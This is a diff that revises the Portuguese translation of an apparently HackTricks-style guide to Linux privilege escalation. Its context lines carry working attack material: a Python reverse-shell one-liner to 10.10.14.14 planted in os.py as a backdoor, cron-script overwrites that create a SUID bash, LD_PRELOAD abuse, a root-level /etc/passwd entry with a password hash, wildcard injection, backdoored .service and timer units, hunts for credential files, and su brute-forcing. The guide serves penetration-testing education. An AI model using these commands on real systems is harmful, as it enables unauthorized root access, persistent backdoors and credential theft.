@@ -18,7 +18,7 @@ Se você **tiver permissões de escrita em qualquer pasta dentro da variável `P
 ```bash
 echo $PATH
 ```
-### Env info
+### Informações do ambiente
 
 Informações interessantes, senhas ou chaves de API nas variáveis de ambiente?
 ```bash
@@ -75,7 +75,7 @@ sudo -u#-1 /bin/bash
 ```
 ### Dmesg verificação de assinatura falhou
 
-Verifique a **caixa smasher2 do HTB** para um **exemplo** de como essa vulnerabilidade pode ser explorada.
+Verifique a **smasher2 box do HTB** para um **exemplo** de como essa vulnerabilidade pode ser explorada
 ```bash
 dmesg 2>/dev/null | grep "signature"
 ```
@@ -144,7 +144,7 @@ Enumere binários úteis
 ```bash
 which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
 ```
-Além disso, verifique se **algum compilador está instalado**. Isso é útil se você precisar usar algum exploit de kernel, pois é recomendado compilá-lo na máquina onde você vai usá-lo (ou em uma semelhante).
+Além disso, verifique se **algum compilador está instalado**. Isso é útil se você precisar usar algum exploit de kernel, pois é recomendável compilá-lo na máquina onde você vai usá-lo (ou em uma semelhante).
 ```bash
 (dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
 ```
@@ -168,7 +168,7 @@ ps aux
 ps -ef
 top -n 1
 ```
-Sempre verifique se há possíveis [**electron/cef/chromium debuggers** em execução, você pode abusar disso para escalar privilégios](electron-cef-chromium-debugger-abuse.md). **Linpeas** detecta isso verificando o parâmetro `--inspect` dentro da linha de comando do processo.\
+Sempre verifique se há possíveis [**depuradores electron/cef/chromium**] em execução, você pode abusar disso para escalar privilégios](electron-cef-chromium-debugger-abuse.md). **Linpeas** detecta isso verificando o parâmetro `--inspect` dentro da linha de comando do processo.\
 Além disso, **verifique seus privilégios sobre os binários dos processos**, talvez você possa sobrescrever alguém.
 
 ### Monitoramento de processos
@@ -178,7 +178,7 @@ Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/ps
 ### Memória do processo
 
 Alguns serviços de um servidor salvam **credenciais em texto claro dentro da memória**.\
-Normalmente, você precisará de **privilégios de root** para ler a memória de processos que pertencem a outros usuários, portanto, isso geralmente é mais útil quando você já é root e deseja descobrir mais credenciais.\
+Normalmente, você precisará de **privilegios de root** para ler a memória de processos que pertencem a outros usuários, portanto, isso geralmente é mais útil quando você já é root e deseja descobrir mais credenciais.\
 No entanto, lembre-se de que **como um usuário comum, você pode ler a memória dos processos que possui**.
 
 > [!WARNING]
@@ -334,7 +334,7 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
 #Wait cron job to be executed
 /tmp/bash -p #The effective uid and gid to be set to the real uid and gid
 ```
-### Cron usando um script com um curinga (Injeção de Curinga)
+### Cron usando um script com um caractere curinga (Injeção de Caractere Curioso)
 
 Se um script executado pelo root tiver um “**\***” dentro de um comando, você pode explorar isso para fazer coisas inesperadas (como privesc). Exemplo:
 ```bash
@@ -342,8 +342,7 @@ rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh mys
 ```
 **Se o caractere curinga for precedido de um caminho como** _**/some/path/\***_ **, não é vulnerável (mesmo** _**./\***_ **não é).**
 
-Leia a página a seguir para mais truques de exploração de caracteres curinga:
-
+Leia a página a seguir para mais truques de exploração de curingas:
 
 {{#ref}}
 wildcards-spare-tricks.md
@@ -351,7 +350,7 @@ wildcards-spare-tricks.md
 
 ### Sobrescrita de script cron e symlink
 
-Se você **pode modificar um script cron** executado pelo root, você pode obter um shell muito facilmente:
+Se você **pode modificar um script cron** executado pelo root, pode obter um shell muito facilmente:
 ```bash
 echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
 #Wait until it is executed
@@ -381,12 +380,12 @@ for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; do
 
 ### Arquivos _.service_ graváveis
 
-Verifique se você pode escrever em algum arquivo `.service`, se puder, você **poderia modificá-lo** para que **execute** seu **backdoor quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez você precise esperar até que a máquina seja reiniciada).\
+Verifique se você pode escrever em algum arquivo `.service`, se puder, você **poderia modificá-lo** para que ele **execute** seu **backdoor quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez você precise esperar até que a máquina seja reiniciada).\
 Por exemplo, crie seu backdoor dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**
 
 ### Binários de serviço graváveis
 
-Tenha em mente que se você tiver **permissões de gravação sobre binários sendo executados por serviços**, você pode alterá-los para backdoors, de modo que quando os serviços forem reexecutados, os backdoors serão executados.
+Tenha em mente que se você tiver **permissões de gravação sobre binários sendo executados por serviços**, você pode alterá-los para backdoors, de modo que, quando os serviços forem reexecutados, os backdoors serão executados.
 
 ### PATH do systemd - Caminhos Relativos
 
@@ -404,11 +403,11 @@ Então, crie um **executável** com o **mesmo nome que o caminho relativo do bin
 
 **Saiba mais sobre serviços com `man systemd.service`.**
 
-## **Timers**
+## **Temporizadores**
 
-**Timers** são arquivos de unidade do systemd cujo nome termina em `**.timer**` que controlam arquivos ou eventos `**.service**`. **Timers** podem ser usados como uma alternativa ao cron, pois têm suporte embutido para eventos de tempo de calendário e eventos de tempo monótono e podem ser executados de forma assíncrona.
+**Temporizadores** são arquivos de unidade do systemd cujo nome termina em `**.timer**` que controlam arquivos ou eventos `**.service**`. **Temporizadores** podem ser usados como uma alternativa ao cron, pois têm suporte embutido para eventos de tempo de calendário e eventos de tempo monotônico e podem ser executados de forma assíncrona.
 
-Você pode enumerar todos os timers com:
+Você pode enumerar todos os temporizadores com:
 ```bash
 systemctl list-timers --all
 ```
@@ -420,7 +419,7 @@ Unit=backdoor.service
 ```
 Na documentação, você pode ler o que é a Unidade:
 
-> A unidade a ser ativada quando este temporizador expirar. O argumento é um nome de unidade, cujo sufixo não é ".timer". Se não especificado, este valor padrão é um serviço que tem o mesmo nome que a unidade do temporizador, exceto pelo sufixo. (Veja acima.) É recomendável que o nome da unidade que é ativada e o nome da unidade do temporizador sejam nomeados de forma idêntica, exceto pelo sufixo.
+> A unidade a ser ativada quando este temporizador expirar. O argumento é um nome de unidade, cujo sufixo não é ".timer". Se não especificado, este valor padrão é um serviço que tem o mesmo nome que a unidade do temporizador, exceto pelo sufixo. (Veja acima.) É recomendável que o nome da unidade que é ativada e o nome da unidade do temporizador tenham nomes idênticos, exceto pelo sufixo.
 
 Portanto, para abusar dessa permissão, você precisaria:
 
@@ -447,7 +446,7 @@ Os sockets podem ser configurados usando arquivos `.socket`.
 **Saiba mais sobre sockets com `man systemd.socket`.** Dentro deste arquivo, vários parâmetros interessantes podem ser configurados:
 
 - `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Essas opções são diferentes, mas um resumo é usado para **indicar onde ele vai escutar** o socket (o caminho do arquivo de socket AF_UNIX, o IPv4/6 e/ou número da porta para escutar, etc.)
-- `Accept`: Aceita um argumento booleano. Se **true**, uma **instância de serviço é gerada para cada conexão recebida** e apenas o socket de conexão é passado para ele. Se **false**, todos os sockets de escuta são **passados para a unidade de serviço iniciada**, e apenas uma unidade de serviço é gerada para todas as conexões. Este valor é ignorado para sockets de datagrama e FIFOs onde uma única unidade de serviço lida incondicionalmente com todo o tráfego recebido. **O padrão é false**. Por razões de desempenho, é recomendado escrever novos daemons apenas de uma forma que seja adequada para `Accept=no`.
+- `Accept`: Aceita um argumento booleano. Se **verdadeiro**, uma **instância de serviço é gerada para cada conexão recebida** e apenas o socket de conexão é passado para ele. Se **falso**, todos os sockets de escuta são **passados para a unidade de serviço iniciada**, e apenas uma unidade de serviço é gerada para todas as conexões. Este valor é ignorado para sockets de datagrama e FIFOs onde uma única unidade de serviço lida incondicionalmente com todo o tráfego recebido. **O padrão é falso**. Por razões de desempenho, é recomendado escrever novos daemons apenas de uma maneira que seja adequada para `Accept=no`.
 - `ExecStartPre`, `ExecStartPost`: Aceita uma ou mais linhas de comando, que são **executadas antes** ou **depois** que os **sockets**/FIFOs de escuta são **criados** e vinculados, respectivamente. O primeiro token da linha de comando deve ser um nome de arquivo absoluto, seguido por argumentos para o processo.
 - `ExecStopPre`, `ExecStopPost`: Comandos adicionais que são **executados antes** ou **depois** que os **sockets**/FIFOs de escuta são **fechados** e removidos, respectivamente.
 - `Service`: Especifica o nome da unidade de **serviço** **a ser ativada** no **tráfego recebido**. Esta configuração é permitida apenas para sockets com Accept=no. O padrão é o serviço que tem o mesmo nome que o socket (com o sufixo substituído). Na maioria dos casos, não deve ser necessário usar esta opção.
@@ -483,7 +482,7 @@ socket-command-injection.md
 
 ### Sockets HTTP
 
-Observe que pode haver alguns **sockets ouvindo por requisições HTTP** (_não estou falando sobre arquivos .socket, mas os arquivos que atuam como sockets unix_). Você pode verificar isso com:
+Note que pode haver alguns **sockets ouvindo por requisições HTTP** (_não estou falando sobre arquivos .socket, mas os arquivos que atuam como sockets unix_). Você pode verificar isso com:
 ```bash
 curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
 ```
@@ -540,7 +539,7 @@ Após configurar a conexão `socat`, você pode executar comandos diretamente no
 
 Observe que se você tiver permissões de gravação sobre o socket do docker porque está **dentro do grupo `docker`**, você tem [**mais maneiras de escalar privilégios**](interesting-groups-linux-pe/index.html#docker-group). Se a [**API do docker estiver ouvindo em uma porta**, você também pode ser capaz de comprometê-la](../../network-services-pentesting/2375-pentesting-docker.md#compromising).
 
-Verifique **mais maneiras de sair do docker ou abusar dele para escalar privilégios** em:
+Verifique **mais maneiras de escapar do docker ou abusar dele para escalar privilégios** em:
 
 {{#ref}}
 docker-security/
@@ -564,7 +563,7 @@ runc-privilege-escalation.md
 
 ## **D-Bus**
 
-D-Bus é um sofisticado **sistema de Comunicação Inter-Processos (IPC)** que permite que aplicativos interajam e compartilhem dados de forma eficiente. Projetado com o sistema Linux moderno em mente, oferece uma estrutura robusta para diferentes formas de comunicação entre aplicativos.
+D-Bus é um sofisticado **sistema de Comunicação Interprocessos (IPC)** que permite que aplicativos interajam e compartilhem dados de forma eficiente. Projetado com o sistema Linux moderno em mente, oferece uma estrutura robusta para diferentes formas de comunicação entre aplicativos.
 
 O sistema é versátil, suportando IPC básico que melhora a troca de dados entre processos, reminiscentes de **sockets de domínio UNIX aprimorados**. Além disso, ajuda na transmissão de eventos ou sinais, promovendo uma integração perfeita entre os componentes do sistema. Por exemplo, um sinal de um daemon Bluetooth sobre uma chamada recebida pode fazer um reprodutor de música silenciar, melhorando a experiência do usuário. Além disso, o D-Bus suporta um sistema de objetos remotos, simplificando solicitações de serviços e invocações de métodos entre aplicativos, agilizando processos que eram tradicionalmente complexos.
 
@@ -681,7 +680,7 @@ echo "Highlighted text: "`xsel -o 2>/dev/null`
 else echo "Not found xsel and xclip"
 fi
 ```
-### Política de Senhas
+### Política de Senha
 ```bash
 grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
 ```
@@ -691,14 +690,14 @@ Se você **sabe alguma senha** do ambiente **tente fazer login como cada usuári
 
 ### Su Brute
 
-Se você não se importa em fazer muito barulho e os binários `su` e `timeout` estão presentes no computador, você pode tentar forçar a entrada de usuários usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
+Se não se importar em fazer muito barulho e os binários `su` e `timeout` estiverem presentes no computador, você pode tentar forçar a entrada de usuários usando [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
 [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) com o parâmetro `-a` também tenta forçar a entrada de usuários.
 
 ## Abusos de PATH gravável
 
 ### $PATH
 
-Se você descobrir que pode **escrever dentro de alguma pasta do $PATH** você pode ser capaz de escalar privilégios **criando um backdoor dentro da pasta gravável** com o nome de algum comando que será executado por um usuário diferente (idealmente root) e que **não é carregado de uma pasta que está localizada antes** da sua pasta gravável no $PATH.
+Se você descobrir que pode **escrever dentro de alguma pasta do $PATH**, pode ser capaz de escalar privilégios **criando um backdoor dentro da pasta gravável** com o nome de algum comando que será executado por um usuário diferente (idealmente root) e que **não é carregado de uma pasta que está localizada antes** da sua pasta gravável no $PATH.
 
 ### SUDO e SUID
 
@@ -773,7 +772,7 @@ Essa técnica também pode ser usada se um **suid** binário **executar outro co
 
 ### Binário SUID com caminho de comando
 
-Se o **suid** binário **executar outro comando especificando o caminho**, então, você pode tentar **exportar uma função** nomeada como o comando que o arquivo suid está chamando.
+Se o binário **suid** **executar outro comando especificando o caminho**, então, você pode tentar **exportar uma função** nomeada como o comando que o arquivo suid está chamando.
 
 Por exemplo, se um binário suid chama _**/usr/sbin/service apache2 start**_, você deve tentar criar a função e exportá-la:
 ```bash
@@ -818,7 +817,7 @@ Finalmente, **escalar privilégios** executando
 sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
 ```
 > [!CAUTION]
-> Um privesc semelhante pode ser explorado se o atacante controlar a variável de ambiente **LD_LIBRARY_PATH** porque ele controla o caminho onde as bibliotecas serão procuradas.
+> Um privesc semelhante pode ser abusado se o atacante controlar a variável de ambiente **LD_LIBRARY_PATH** porque ele controla o caminho onde as bibliotecas serão procuradas.
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -1082,12 +1081,12 @@ setfacl -b file.txt #Remove the ACL of the file
 ```bash
 getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
-## Open shell sessions
+## Abrir sessões de shell
 
-Em **versões antigas** você pode **sequestar** algumas **sessões de shell** de um usuário diferente (**root**).\
-Em **versões mais recentes** você poderá **conectar-se** apenas às sessões de tela do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.
+Em **versões antigas**, você pode **sequestar** algumas sessões de **shell** de um usuário diferente (**root**).\
+Em **versões mais recentes**, você poderá **conectar-se** apenas às sessões de tela do **seu próprio usuário**. No entanto, você pode encontrar **informações interessantes dentro da sessão**.
 
-### screen sessions hijacking
+### sequestro de sessões de tela
 
 **Listar sessões de tela**
 ```bash
@@ -1150,7 +1149,7 @@ Especifica se o root pode fazer login usando ssh, o padrão é `no`. Valores pos
 
 ### AuthorizedKeysFile
 
-Especifica arquivos que contêm as chaves públicas que podem ser usadas para autenticação de usuário. Pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (começando em `/`) ou **caminhos relativos a partir do home do usuário**. Por exemplo:
+Especifica arquivos que contêm as chaves públicas que podem ser usadas para autenticação de usuários. Pode conter tokens como `%h`, que serão substituídos pelo diretório home. **Você pode indicar caminhos absolutos** (começando em `/`) ou **caminhos relativos a partir do home do usuário**. Por exemplo:
 ```bash
 AuthorizedKeysFile    .ssh/authorized_keys access
 ```
@@ -1165,7 +1164,7 @@ Você precisa definir essa opção em `$HOME/.ssh.config` assim:
 Host example.com
 ForwardAgent yes
 ```
-Note que se `Host` for `*`, toda vez que o usuário pular para uma máquina diferente, esse host poderá acessar as chaves (o que é um problema de segurança).
+Observe que se `Host` for `*`, toda vez que o usuário pular para uma máquina diferente, esse host poderá acessar as chaves (o que é um problema de segurança).
 
 O arquivo `/etc/ssh_config` pode **substituir** essas **opções** e permitir ou negar essa configuração.\
 O arquivo `/etc/sshd_config` pode **permitir** ou **negar** o encaminhamento do ssh-agent com a palavra-chave `AllowAgentForwarding` (o padrão é permitir).
@@ -1180,7 +1179,7 @@ ssh-forward-agent-exploitation.md
 
 ### Arquivos de Perfis
 
-O arquivo `/etc/profile` e os arquivos sob `/etc/profile.d/` são **scripts que são executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles, você pode escalar privilégios**.
+O arquivo `/etc/profile` e os arquivos sob `/etc/profile.d/` são **scripts que são executados quando um usuário inicia um novo shell**. Portanto, se você puder **escrever ou modificar qualquer um deles, poderá escalar privilégios**.
 ```bash
 ls -l /etc/profile /etc/profile.d/
 ```
@@ -1211,7 +1210,7 @@ Então adicione o usuário `hacker` e adicione a senha gerada.
 ```
 hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
 ```
-Ex.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
+Exemplo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`
 
 Agora você pode usar o comando `su` com `hacker:hacker`
 
@@ -1223,7 +1222,7 @@ su - dummy
 ```
 NOTA: Em plataformas BSD, `/etc/passwd` está localizado em `/etc/pwd.db` e `/etc/master.passwd`, além disso, o `/etc/shadow` é renomeado para `/etc/spwd.db`.
 
-Você deve verificar se consegue **escrever em alguns arquivos sensíveis**. Por exemplo, você pode escrever em algum **arquivo de configuração de serviço**?
+Você deve verificar se pode **escrever em alguns arquivos sensíveis**. Por exemplo, você pode escrever em algum **arquivo de configuração de serviço**?
 ```bash
 find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
 for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
@@ -1267,7 +1266,7 @@ find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -p
 ```bash
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
-### \*\_histórico, .sudo_as_admin_successful, perfil, bashrc, httpd.conf, .plano, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml arquivos
+### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml arquivos
 ```bash
 find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
 ```
@@ -1304,7 +1303,7 @@ Além disso, alguns **logs de auditoria** "**mal**" configurados (com backdoor?)
 aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
 grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
 ```
-Para **ler logs o grupo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) será realmente útil.
+Para **ler logs, o grupo** [**adm**](interesting-groups-linux-pe/index.html#adm-group) será realmente útil.
 
 ### Arquivos de shell
 ```bash
@@ -1332,7 +1331,7 @@ Para **backdoor a biblioteca**, basta adicionar ao final da biblioteca os.py a s
 ```python
 import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
 ```
-### Exploração do Logrotate
+### Exploração do logrotate
 
 Uma vulnerabilidade no `logrotate` permite que usuários com **permissões de escrita** em um arquivo de log ou em seus diretórios pai potencialmente ganhem privilégios elevados. Isso ocorre porque o `logrotate`, frequentemente executado como **root**, pode ser manipulado para executar arquivos arbitrários, especialmente em diretórios como _**/etc/bash_completion.d/**_. É importante verificar as permissões não apenas em _/var/log_, mas também em qualquer diretório onde a rotação de logs é aplicada.
 
@@ -1349,9 +1348,9 @@ Esta vulnerabilidade é muito semelhante a [**CVE-2016-1247**](https://www.cvede
 
 **Referência de vulnerabilidade:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 
-Se, por qualquer motivo, um usuário conseguir **escrever** um script `ifcf-<qualquer>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um existente, então seu **sistema está comprometido**.
+Se, por qualquer motivo, um usuário conseguir **escrever** um script `ifcf-<whatever>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um existente, então seu **sistema está comprometido**.
 
-Scripts de rede, _ifcg-eth0_ por exemplo, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, eles são \~sourced\~ no Linux pelo Network Manager (dispatcher.d).
+Scripts de rede, como _ifcg-eth0_, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, eles são \~sourced\~ no Linux pelo Network Manager (dispatcher.d).
 
 No meu caso, o `NAME=` atribuído nesses scripts de rede não é tratado corretamente. Se você tiver **espaço em branco no nome, o sistema tenta executar a parte após o espaço em branco**. Isso significa que **tudo após o primeiro espaço em branco é executado como root**.
 
@@ -1363,9 +1362,9 @@ DEVICE=eth0
 ```
 ### **init, init.d, systemd e rc.d**
 
-O diretório `/etc/init.d` é o lar de **scripts** para o System V init (SysVinit), o **sistema clássico de gerenciamento de serviços do Linux**. Ele inclui scripts para `start`, `stop`, `restart` e, às vezes, `reload` serviços. Esses podem ser executados diretamente ou através de links simbólicos encontrados em `/etc/rc?.d/`. Um caminho alternativo em sistemas Redhat é `/etc/rc.d/init.d`.
+O diretório `/etc/init.d` é o lar de **scripts** para o System V init (SysVinit), o **sistema clássico de gerenciamento de serviços do Linux**. Ele inclui scripts para `iniciar`, `parar`, `reiniciar` e, às vezes, `recarregar` serviços. Esses scripts podem ser executados diretamente ou através de links simbólicos encontrados em `/etc/rc?.d/`. Um caminho alternativo em sistemas Redhat é `/etc/rc.d/init.d`.
 
-Por outro lado, `/etc/init` está associado ao **Upstart**, um **gerenciador de serviços** mais novo introduzido pelo Ubuntu, usando arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para o Upstart, scripts do SysVinit ainda são utilizados juntamente com as configurações do Upstart devido a uma camada de compatibilidade no Upstart.
+Por outro lado, `/etc/init` está associado ao **Upstart**, um **gerenciador de serviços** mais novo introduzido pelo Ubuntu, que utiliza arquivos de configuração para tarefas de gerenciamento de serviços. Apesar da transição para o Upstart, scripts do SysVinit ainda são utilizados juntamente com as configurações do Upstart devido a uma camada de compatibilidade no Upstart.
 
 **systemd** surge como um gerenciador de inicialização e serviços moderno, oferecendo recursos avançados, como inicialização de daemon sob demanda, gerenciamento de automontagem e instantâneas do estado do sistema. Ele organiza arquivos em `/usr/lib/systemd/` para pacotes de distribuição e `/etc/systemd/system/` para modificações de administradores, simplificando o processo de administração do sistema.
 
@@ -1373,17 +1372,20 @@ Por outro lado, `/etc/init` está associado ao **Upstart**, um **gerenciador de 
 
 ### Escalada de privilégios NFS
 
+
 {{#ref}}
 nfs-no_root_squash-misconfiguration-pe.md
 {{#endref}}
 
-### Escapando de Shells restritas
+### Escapando de Shells restritos
+
 
 {{#ref}}
 escaping-from-limited-bash.md
 {{#endref}}
 
 ### Cisco - vmanage
+
 
 {{#ref}}
 cisco-vmanage.md
@@ -1402,12 +1404,12 @@ cisco-vmanage.md
 
 ### **Melhor ferramenta para procurar vetores de escalada de privilégios locais no Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
 
-**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
+**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opção -t)\
 **Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
 **Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
 **Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
 **BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
-**Kernelpop:** Enumere vulnerabilidades do kernel no linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
+**Kernelpop:** Enumera vulnerabilidades do kernel no linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
 **Mestaploit:** _**multi/recon/local_exploit_suggester**_\
 **Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
 **EvilAbigail (acesso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
@@ -1433,9 +1435,11 @@ cisco-vmanage.md
 - [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
 - [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
 
+
 ## Frameworks de rooting Android: abuso de canal de gerenciador
 
 Frameworks de rooting Android geralmente interceptam uma syscall para expor funcionalidades privilegiadas do kernel a um gerenciador de espaço de usuário. A autenticação fraca do gerenciador (por exemplo, verificações de assinatura baseadas na ordem FD ou esquemas de senha fracos) pode permitir que um aplicativo local se passe pelo gerenciador e escale para root em dispositivos já com root. Aprenda mais e detalhes de exploração aqui:
+
 
 {{#ref}}
 android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
